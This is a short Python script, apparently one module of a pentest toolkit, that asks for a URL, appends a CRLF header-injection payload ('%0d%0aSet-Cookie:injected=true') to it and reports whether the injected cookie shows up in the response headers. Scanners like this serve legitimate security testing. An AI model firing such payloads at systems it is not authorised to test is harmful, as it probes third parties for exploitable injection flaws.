import requests
from colorama import Fore

def run():
    url = input("\n[+] Enter URL: ").strip()
    test_payload = "/%0d%0aSet-Cookie:injected=true"
    
    try:
        response = requests.get(url + test_payload)
        if "injected=true" in str(response.headers):
            print(Fore.GREEN + "[+] CRLF Injection Vulnerable!")
        else:
            print(Fore.RED + "[!] Not vulnerable to CRLF")
    except Exception as e:
        print(Fore.RED + f"[!] Error: {str(e)}")